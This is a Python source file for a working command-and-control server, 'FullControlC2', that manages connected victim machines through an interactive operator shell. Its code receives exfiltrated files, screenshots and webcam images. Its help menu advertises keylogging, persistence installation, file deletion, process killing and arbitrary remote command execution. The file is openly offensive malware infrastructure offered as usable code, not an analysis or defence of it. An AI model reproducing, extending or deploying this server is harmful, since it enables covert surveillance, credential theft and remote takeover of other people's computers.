# server.py – Full Control C2 Server with Graceful Shutdown
import socket
import threading
import json
import os
import time
import signal
import sys

class FullControlC2:
    def __init__(self, host='127.0.0.1', port=5555):
        self.host = host
        self.port = port
        self.clients = {}
        self.running = True
        self.server_socket = None

    def send_command(self, conn, cmd):
        try:
            conn.sendall(cmd.encode())
            if cmd.startswith("download "):
                return self.receive_file(conn)
            elif cmd.startswith("upload "):
                return self.upload_file(conn, cmd)
            elif cmd == "screenshot":
                return self.receive_screenshot(conn)
            elif cmd == "webcam":
                return self.receive_webcam(conn)
            else:
                conn.settimeout(30)
                response = conn.recv(65536).decode()
                conn.settimeout(None)
                return response
        except socket.timeout:
            return "[-] Command timeout"
        except Exception as e:
            return f"[-] Error: {e}"

    def receive_file(self, conn):
        try:
            file_data = b""
            conn.settimeout(10)
            while True:
                chunk = conn.recv(4096)
                if chunk == b"__ENDOFFILE__":
                    break
                if not chunk:
                    break
                file_data += chunk
            conn.settimeout(None)
            filename = f"downloaded_{int(time.time())}"
            with open(filename, 'wb') as f:
                f.write(file_data)
            return f"[+] File saved as {filename} ({len(file_data)} bytes)"
        except Exception as e:
            return f"[-] Receive error: {e}"

    def upload_file(self, conn, cmd):
        try:
            parts = cmd.split()
            if len(parts) < 2:
                return "[-] Usage: upload <filepath>"
            local_path = parts[1]
            if not os.path.exists(local_path):
                return f"[-] File not found: {local_path}"
            with open(local_path, 'rb') as f:
                data = f.read()
            conn.sendall(data)
            conn.sendall(b"__ENDOFFILE__")
            return f"[+] Upload sent: {local_path} ({len(data)} bytes)"
        except Exception as e:
            return f"[-] Upload error: {e}"

    def receive_screenshot(self, conn):
        try:
            data = b""
            conn.settimeout(30)
            while True:
                chunk = conn.recv(65536)
                if chunk == b"__END__":
                    break
                if not chunk:
                    break
                data += chunk
            conn.settimeout(None)
            filename = f"screenshot_{int(time.time())}.png"
            with open(filename, 'wb') as f:
                f.write(data)
            return f"[+] Screenshot saved: {filename} ({len(data)} bytes)"
        except Exception as e:
            return f"[-] Screenshot error: {e}"

    def receive_webcam(self, conn):
        try:
            data = b""
            conn.settimeout(30)
            while True:
                chunk = conn.recv(65536)
                if chunk == b"__END__":
                    break
                if not chunk:
                    break
                data += chunk
            conn.settimeout(None)
            filename = f"webcam_{int(time.time())}.jpg"
            with open(filename, 'wb') as f:
                f.write(data)
            return f"[+] Webcam capture saved: {filename} ({len(data)} bytes)"
        except Exception as e:
            return f"[-] Webcam error: {e}"

    def interactive_shell(self, conn, addr):
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"\n[+] Interactive session with {client_id}")
        print("Commands: exit, help")
        
        while self.running:
            try:
                cmd = input(f"\n[{client_id}] $> ")
                if not cmd:
                    continue
                
                if cmd.lower() == "exit":
                    try:
                        conn.sendall(b"exit")
                    except:
                        pass
                    break
                elif cmd.lower() == "help":
                    self.show_help()
                    continue
                
                response = self.send_command(conn, cmd)
                print(response)
                
            except (ConnectionResetError, BrokenPipeError):
                print(f"\n[-] Client {client_id} disconnected")
                break
            except KeyboardInterrupt:
                print("\n[!] Ctrl+C detected. Type 'exit' to close session or press Ctrl+C again to force quit.")
                continue
            except Exception as e:
                print(f"[-] Error: {e}")
                break
        
        print(f"[+] Session ended for {client_id}")

    def show_help(self):
        help_text = """
=== C2 Server Commands ===
info                - Get system info
ls [path]           - List directory
cd <path>           - Change directory
pwd                 - Show current path
rm <path>           - Delete file/dir
ps                  - List processes
kill <PID>          - Terminate process
download <path>     - Download file from client
upload <path>       - Upload file to client
screenshot          - Capture screenshot
webcam              - Capture webcam
keylog_start        - Start keylogger
keylog_stop         - Stop keylogger
keylog_dump         - Show keystrokes
persist             - Install persistence
exit                - Close session
help                - Show this help
<command>           - Execute any system command
"""
        print(help_text)

    def signal_handler(self, sig, frame):
        print("\n[!] Shutting down server gracefully...")
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        sys.exit(0)

    def start(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1)  # Allows checking self.running
            
            print(f"[C2] Server listening on {self.host}:{self.port}")
            print("[C2] Press Ctrl+C to shutdown gracefully")
            
            while self.running:
                try:
                    conn, addr = self.server_socket.accept()
                    print(f"\n[+] New connection from {addr[0]}:{addr[1]}")
                    client_thread = threading.Thread(target=self.interactive_shell, args=(conn, addr), daemon=True)
                    client_thread.start()
                except socket.timeout:
                    continue
                except OSError:
                    if self.running:
                        continue
                    break
                    
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
            print("[+] Server shutdown complete")

if __name__ == '__main__':
    server = FullControlC2()
    server.start()